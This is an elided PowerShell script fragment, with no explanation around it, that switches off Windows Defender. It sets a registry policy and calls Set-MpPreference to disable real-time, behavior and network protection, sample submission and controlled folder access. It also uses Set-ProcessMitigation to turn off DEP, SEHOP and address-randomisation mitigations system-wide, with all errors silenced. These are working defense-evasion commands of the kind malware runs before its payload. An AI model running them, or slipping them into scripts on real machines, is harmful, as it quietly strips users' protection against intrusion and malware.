...
$RegKeys = @(
    ...
    @("HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableHeuristicRealTimeMonitoring", 1),
...
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2 -PUAProtection Disabled -EnableControlledFolderAccess Disabled -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue

Set-ProcessMitigation -System -Disable DEP, BottomUp, HighEntropy, SEHOP -ErrorAction SilentlyContinue
...
Get-ChildItem -Path $CUFT | ForEach-Object {
    ...
    if (Test-Path $Top) {
        Get-ChildItem -Path $Top | ForEach-Object {
